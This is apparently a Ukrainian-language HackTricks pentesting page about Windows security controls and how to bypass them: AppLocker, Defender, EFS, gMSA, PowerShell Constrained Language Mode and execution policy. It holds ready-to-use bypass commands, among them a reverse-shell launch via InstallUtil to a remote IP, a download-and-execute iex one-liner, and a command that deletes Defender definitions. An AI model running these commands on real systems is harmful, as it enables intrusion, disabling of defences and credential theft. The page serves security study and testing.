# Контролі безпеки Windows

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) для легкої побудови та **автоматизації робочих процесів** за допомогою найбільш **продвинутих інструментів спільноти** у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Політика AppLocker

Білий список програм - це список схвалених програм або виконуваних файлів, які дозволяється присутнім та запускатися на системі. Мета полягає в захисті середовища від шкідливих програм-шпигунів та недозволених програм, які не відповідають конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) - це **рішення для створення білого списку програм** від Microsoft, яке дає адміністраторам систем контроль над **програмами та файлами, які можуть виконувати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами установки Windows, DLL-бібліотеками, упакованими програмами та програмами для установки упакованих програм.\
Зазвичай організації **блокують cmd.exe та PowerShell.exe** та доступ на запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення перебувають у чорному/білому списку:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, які застосовуються AppLocker, надаючи можливість переглянути поточний набір правил, які діють в системі:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Обхід

* Корисні **Папки для запису**, щоб обійти політику AppLocker: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, є **папки для запису**, які можна використовувати для **обходу цього**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Зазвичай **довіряються** [**"LOLBAS's"**](https://lolbas-project.github.io/) бінарні файли також можуть бути корисними для обхіду AppLocker.
* **Погано написані правила також можуть бути обхідними**
* Наприклад, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, ви можете створити **папку з назвою `allowed`** де завгодно, і вона буде дозволена.
* Організації часто фокусуються на **блокуванні виконування виконуваних файлів `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
* **Завантаження DLL майже ніколи не увімкнене** через додаткове навантаження на систему та кількість тестувань, необхідних для забезпечення того, що нічого не зламається. Таким чином, використання **DLL як задніх дверей допоможе обійти AppLocker**.
* Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) для **виконання коду Powershell** в будь-якому процесі та обходу AppLocker. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Зберігання облікових даних

### Менеджер облікових записів безпеки (SAM)

Локальні облікові дані присутні в цьому файлі, паролі захешовані.

### Локальна служба безпеки (LSA) - LSASS

**Облікові дані** (захешовані) **зберігаються** в **пам'яті** цієї підсистеми з метою одноразового входу.\
**LSA** керує локальною **політикою безпеки** (політика паролів, дозволи користувачів...), **аутентифікацією**, **токенами доступу**...\
LSA буде перевіряти надані облікові дані всередині файлу **SAM** (для локального входу) та **спілкуватися** з **контролером домену** для аутентифікації користувача домену.

**Облікові дані** зберігаються всередині **процесу LSASS**: квитки Kerberos, хеші NT та LM, легко розшифровані паролі.

### Секрети LSA

LSA може зберігати на диску деякі облікові дані:

* Пароль облікового запису комп'ютера Active Directory (недосяжний контролер домену).
* Паролі облікових записів служб Windows
* Паролі для запланованих завдань
* Ще (пароль додатків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на контролерах домену.

## Захисник

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) - це антивірус, який доступний в Windows 10 та Windows 11, а також у версіях Windows Server. Він **блокує** загальні інструменти для пентестінгу, такі як **`WinPEAS`**. Однак існують способи **обхіду цих захистів**.

### Перевірка

Для перевірки **стану** **Захисника** ви можете виконати PS-команду **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи він активний):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Для переліку ви також можете виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ** під назвою **Ключ шифрування файлів (FEK)**. Цей ключ зашифрований за допомогою **публічного ключа** користувача та зберігається у **альтернативному потоці даних** $EFS зашифрованого файлу. При необхідності розшифрування, використовується відповідний **приватний ключ** цифрового сертифіката користувача для розшифрування FEK з потоку $EFS. Додаткові деталі можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**Сценарії розшифрування без ініціації користувача** включають:

* Коли файли або папки переміщуються на не-EFS файлову систему, наприклад, [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), вони автоматично розшифровуються.
* Зашифровані файли, відправлені через мережу за протоколом SMB/CIFS, розшифровуються перед передачею.

Цей метод шифрування дозволяє **прозорий доступ** до зашифрованих файлів для власника. Однак просто зміна пароля власника та вхід в систему не дозволить розшифрування.

**Основні висновки**:

* EFS використовує симетричний FEK, зашифрований за допомогою публічного ключа користувача.
* Розшифрування використовує приватний ключ користувача для доступу до FEK.
* Автоматичне розшифрування відбувається в певних умовах, наприклад, при копіюванні на FAT32 або передачі через мережу.
* Зашифровані файли доступні власнику без додаткових кроків.

### Перевірка інформації EFS

Перевірте, чи **користувач** **використовував** цей **сервіс**, перевіривши, чи існує цей шлях: `C:\users\<ім'я_користувача>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, використовуючи `cipher /c \<файл>\`
Ви також можете використовувати `cipher /e` та `cipher /d` всередині папки для **шифрування** та **розшифрування** всіх файлів

### Розшифрування файлів EFS

#### Бути системою авторитету

Для цього способу **користувач жертва** повинен **виконувати** процес всередині хоста. У цьому випадку, використовуючи сесії `meterpreter`, ви можете підробити токен процесу користувача (`impersonate_token` з `incognito`). Або ви можете просто `migrate` до процесу користувача.

#### Знання пароля користувача

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Керовані групові облікові записи служб (gMSA)

Microsoft розробив **Керовані групові облікові записи служб (gMSA)** для спрощення управління обліковими записами служб в ІТ-інфраструктурах. На відміну від традиційних облікових записів служб, у яких часто включена налаштування "**Пароль ніколи не закінчується**", gMSA пропонують більш безпечне та кероване рішення:

* **Автоматичне управління паролями**: gMSA використовують складний пароль у 240 символів, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється Службою розподілу ключів Microsoft (KDC), що усуває необхідність вручних оновлень пароля.
* **Підвищене забезпечення**: Ці облікові записи не піддаються блокуванню та не можуть бути використані для інтерактивних входів, підвищуючи їх безпеку.
* **Підтримка кількох хостів**: gMSA можуть бути використані на кількох хостах, що робить їх ідеальними для служб, які працюють на кількох серверах.
* **Можливість запланованих завдань**: На відміну від керованих облікових записів служб, gMSA підтримують запуск запланованих завдань.
* **Спрощене управління SPN**: Система автоматично оновлює ім'я службового принципалу (SPN), коли відбуваються зміни в деталях sAMaccount комп'ютера або DNS-імені, спрощуючи управління SPN.

Паролі для gMSA зберігаються в властивості LDAP _**msDS-ManagedPassword**_ та автоматично скидаються кожні 30 днів контролерами доменів (DC). Цей пароль, зашифрований блок даних, відомий як [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), може бути отриманий лише авторизованими адміністраторами та серверами, на яких встановлені gMSA, забезпечуючи безпечне середовище. Для доступу до цієї інформації потрібне захищене підключення, таке як LDAPS, або підключення повинно бути аутентифіковане за допомогою 'Sealing & Secure'.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Дізнайтеся більше інформації у цьому пості**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перевірте цю [веб-сторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати атаку **пересилання NTLM** для **читання** **пароля** **gMSA**.

## LAPS

**Рішення для локального адміністраторського пароля (LAPS)**, доступне для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), дозволяє керувати паролями локальних адміністраторів. Ці паролі, які є **випадковими**, унікальними та **регулярно змінюються**, зберігаються централізовано в Active Directory. Доступ до цих паролів обмежений через ACL для авторизованих користувачів. З достатніми наданими дозволами надається можливість читання паролів локальних адміністраторів.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Обмежений режим мови**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, таких як блокування об'єктів COM, дозвіл лише схвалених типів .NET, робочі процеси на основі XAML, класи PowerShell та інше.

### **Перевірка**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```powershell
#Easy bypass
Powershell -version 2
```
У поточній версії Windows цей обхід не працюватиме, але ви можете скористатися [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Для компіляції можливо знадобиться** **додати посилання** -> _Перегляд_ -> _Перегляд_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проект на .Net4.5**.

#### Прямий обхід:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Зворотній шел:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) для **виконання коду Powershell** в будь-якому процесі та обхіду обмеженого режиму. Для отримання додаткової інформації перегляньте: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Політика виконання PS

За замовчуванням вона встановлена на **обмежена.** Основні способи обхіду цієї політики:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Інтерфейс постачальника підтримки безпеки (SSPI)

Це API, яке можна використовувати для аутентифікації користувачів.

SSPI буде відповідальним за знаходження відповідного протоколу для двох машин, які хочуть спілкуватися. Найбажаніший метод для цього - Kerberos. Потім SSPI буде вести переговори про те, який протокол аутентифікації буде використовуватися; ці протоколи аутентифікації називаються постачальниками підтримки безпеки (SSP), вони розташовані у кожній машині з Windows у вигляді DLL, і обидві машини повинні підтримувати однакові, щоб мати можливість спілкуватися.

### Основні постачальники підтримки безпеки (SSP)

* **Kerberos**: Найбажаніший
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** та **NTLMv2**: З причин сумісності
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Веб-сервери та LDAP, пароль у вигляді хешу MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL та TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Використовується для переговорів щодо протоколу, який слід використовувати (Kerberos або NTLM, за замовчуванням Kerberos)
* %windir%\Windows\System32\lsasrv.dll

#### Під час переговорів може бути запропоновано кілька методів або лише один.

## UAC - Контроль облікових записів користувачів

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - це функція, яка дозволяє **запит на підтвердження для підвищених дій**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси** за допомогою найбільш **продвинутих** інструментів спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
